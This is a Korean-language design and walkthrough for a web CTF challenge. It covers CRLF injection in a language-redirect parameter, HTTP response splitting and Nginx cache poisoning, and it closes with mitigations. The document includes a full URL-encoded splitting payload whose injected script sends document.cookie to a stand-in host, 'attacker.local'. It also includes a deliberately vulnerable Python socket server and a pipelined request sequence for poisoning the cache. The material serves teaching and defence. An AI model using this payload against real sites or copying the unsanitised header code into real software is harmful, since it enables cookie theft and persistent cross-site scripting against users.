---
title: HTTP Response Splitting (CRLF Injection) to Cache Poisoning — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, crlf-injection, http-response-splitting, cache-poisoning, web-cache, headers]
confidence: high
---

# HTTP Response Splitting (CRLF Injection) to Cache Poisoning — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Language Router Hub (다국어 리다이렉트 서버)
- **난이도**: High
- **핵심 컨셉**: HTTP 프로토콜 패킷 제어 지시어인 개행 문자 주입을 매개로 하는 **HTTP 응답 분할(HTTP Response Splitting)** 및 **웹 캐시 포이즈닝(Web Cache Poisoning)** 취약점 문제입니다. 대상 애플리케이션은 사용자가 요청한 언어 설정 파라미터(`?lang=...`)를 기반으로 알맞은 로케일 페이지로 이동시키며, 응답 패킷 헤더에 `Set-Cookie` 및 `Location` 지시어를 동적으로 구성합니다. 이때 파라미터 값 내에 개행 제어 코드인 **`\r\n` (CRLF)** 지시어가 포함되어 있을 시 적절히 정제하거나 차단하지 않습니다. 공격자는 개행 문자를 연속 기입하여 HTTP 응답을 두 개의 독립된 응답 패킷으로 쪼개고, 리버스 프록시 캐시(Nginx, Varnish 등)에 임의의 악성 자바스크립트가 담긴 가짜 캐시 응답을 저장시킴으로써 일반 사용자들이 메인화면 접근 시 영구히 감염된 XSS 배너를 마주하도록 유도합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Redirector Service**:
  - `Location: /locale/[LANG]` 헤더를 동적으로 렌더링하여 반환하는 엔드포인트.
- **Reverse Proxy (Nginx Cache)**:
  - 백엔드 응답 성능 가속화를 위해 응답 본문을 URI 기준으로 메모리에 캐싱.
- **Flag 위치**:
  - 웹 캐시 포이즈닝을 통해 메인 페이지의 캐시를 탈취/변조하여, 관리자 봇(Admin Bot)이 메인 페이지에 방문할 때 가짜 페이지 내에 포함된 XSS 코드가 봇의 관리자 토큰을 공격자에게 전달하게 만들어 플래그를 취득합니다.

### 2.2 취약점 지점
1. **CRLF Injection via Language Parameter**:
   - 백엔드 헤더 작성 함수(`res.setHeader` 혹은 raw socket write)가 입력 데이터 속 `%0d%0a` (개행) 제어 코드를 여과하지 않고 헤더 스트림에 그대로 흘려보냅니다.
2. **HTTP Response Splitting**:
   - 공격자는 두 세트의 개행 문자를 주입하여 첫 번째 응답의 헤더 영역을 강제 종료하고, 백엔드가 두 번째 독립 응답 패킷을 연달아 출력하는 것처럼 프로토콜 해석 흐름을 왜곡시킵니다.
   - 프록시 서버는 동일 세션 커넥션 하에서 밀려온 두 번째 응답을 다음 대기 중이던 URI 요청(예: `/index.html`)의 유효한 응답인 줄로 오해하여 캐시에 영구 적재(Poisoning)합니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 파라미터 | 취약 응답 헤더 | 역할 |
|------------|--------|------|----------|----------------|------|
| `/route` | GET | 불필요 | `lang` | `Location: ...` | CRLF 인젝션 및 응답 분할 유발 벡터 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. CRLF 헤더 인젝션 진단
1. 공격자는 다국어 리다이렉트 주소로 테스트를 전송합니다.
   `GET /route?lang=ko`
   - **반환**:
     ```http
     HTTP/1.1 302 Found
     Location: /locale/ko
     ```
2. `lang` 파라미터에 URL 인코딩된 CRLF (`%0d%0a`) 문자와 임의의 커스텀 헤더를 삽입해 봅니다.
   `GET /route?lang=ko%0d%0aX-Test-Header:%20Hacked`
   - **반환 응답**:
     ```http
     HTTP/1.1 302 Found
     Location: /locale/ko
     X-Test-Header: Hacked
     ```
   서버 응답 헤더에 `X-Test-Header` 지시어가 정상 삽입되는 것을 보고 CRLF 주입이 동작함을 확인합니다.

### Step 2. 응답 분할(Response Splitting) 페이로드 제작
한 커넥션 내에 두 개의 완벽한 HTTP 응답이 가동되도록 본문을 설계합니다.
- **인젝션할 전체 원시 텍스트 사양**:
  ```http
  ko
  Content-Length: 0
  
  HTTP/1.1 200 OK
  Content-Type: text/html
  Content-Length: 95
  
  <html><script>fetch('http://attacker.local/log?c='+document.cookie)</script></html>
  ```
- **URL 인코딩된 최종 주입 페이로드**:
  `lang=ko%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2095%0d%0a%0d%0a<html><script>fetch('http://attacker.local/log?c='%2Bdocument.cookie)</script></html>`

### Step 3. 캐시 포이즈닝 (Cache Poisoning) 트리거
1. 프록시 서버(Nginx 등) 파이프라이닝 및 캐시 키 동작원리에 따라, 프록시는 백엔드로 하나의 커넥션을 통해 연달아 두 가지 요청(예: `GET /route` 및 `GET /index.html`)을 보낼 수 있습니다.
2. 공격자는 HTTP 파이프라이닝 요청을 소켓으로 전송합니다.
   - **요청 1**: `GET /route?lang=[악성_페이로드] HTTP/1.1`
   - **요청 2**: `GET /index.html HTTP/1.1`
3. 백엔드는 **요청 1**을 처리하면서 분할된 두 개의 응답을 연달아 보냅니다.
   - 프록시는 첫 번째 분할 응답(302 Found)을 **요청 1**의 결과로 바인딩합니다.
   - 프록시는 이어서 백엔드 소켓 스트림에서 들어오는 두 번째 분할 응답(200 OK 악성 스크립트 바디)을 **요청 2** (`/index.html`)의 유효 응답으로 판별하여, 메인 페이지 주소 `/index.html`에 해당하는 캐시 메모리에 해당 악성 페이지 본문을 적재해 버립니다.

### Step 4. flag 획득
1. 캐시 오염이 완성되면, 일반 관리자 봇이 타겟 사이트 메인 페이지(`http://target.challenge.local/index.html`)를 브라우저로 오픈합니다.
2. 프록시는 오염된 가짜 캐시 데이터(공격자의 자바스크립트가 삽입된 200 OK)를 봇에게 서빙합니다.
3. 봇의 브라우저에서 스크립트가 실행되어 관리자 쿠키 정보가 유출됩니다.
4. 공격자는 유출된 데이터에서 플래그(`FLAG{http_response_splitting_crlf_cache_poisoning_hijack}`)를 획득합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Python Raw Socket Server 개념 예시)

```python
# server.py (취약한 HTTP 헤더 조립 소켓 서버 예시)
import socket
import threading

def handle_client(client_socket):
    try:
        request = client_socket.recv(4096).decode('utf-8')
        if not request:
            return
            
        lines = request.split('\r\n')
        first_line = lines[0]
        # GET /route?lang=... HTTP/1.1 에서 lang 추출
        import urllib.parse
        parsed_url = urllib.parse.urlparse(first_line.split(' ')[1])
        params = urllib.parse.parse_qs(parsed_url.query)
        
        lang = params.get('lang', ['ko'])[0]
        
        # 취약점 지점: lang 문자열 변수 내부에 있는 %0d%0a(\r\n) 개행 문자를 
        # 거르지(Sanitize) 않고 헤더 스트림 작성 문자열에 다이렉트로 결합
        response = (
            "HTTP/1.1 302 Found\r\n"
            f"Location: /locale/{lang}\r\n"
            "Content-Type: text/html\r\n"
            "Connection: keep-alive\r\n\r\n"
        )
        
        client_socket.sendall(response.encode('utf-8'))
    except Exception as e:
        pass
    finally:
        client_socket.close()

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 8080))
    server.listen(5)
    while True:
        conn, addr = server.accept()
        t = threading.Thread(target=handle_client, args=(conn,))
        t.start()

start_server()
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **개행 문자 강력 검증 및 필터링 (Sanitize Carriage Return & Line Feed)**:
   - 모든 HTTP 응답 헤더 쓰기 API 및 함수 라이브러리 연동 시, 입력 문자열 내에 개행을 의미하는 `\r` (CR, `%0d`) 및 `\n` (LF, `%0a`) 문자가 포진되어 있는지 정규식으로 엄격히 체크하여 에러를 발생시키거나 문자열을 공백으로 탈바꿈시킵니다.
     ```python
     # Python 방어 예시
     clean_lang = lang.replace('\r', '').replace('\n', '')
     ```
2. **검증된 웹 서버 프레임워크 최신 API 연동**:
   - 직접 Raw Socket에 헤더 문자열을 포맷팅하는 개발 방식을 배제하고, 헤더 내 개행 삽입 시 자동으로 예외 처리 및 차단을 보장하는 현대적인 백엔드 웹 프레임워크(Express, Spring Boot, Django 등) 내장 헤더 제어 유틸리티를 활용합니다.
3. **프록시 캐싱 정책 조율**:
   - HTTP/1.1 파이프라이닝 처리를 오프하고 HTTP/2 기동을 강제하여 응답 해석 불일치 위험을 해소하며, 캐시 키(Cache Key) 지정 시 질의 파라미터가 비정상적인 구조일 시 캐싱 대상에서 즉각 배제하도록 관리 정책을 수립합니다.
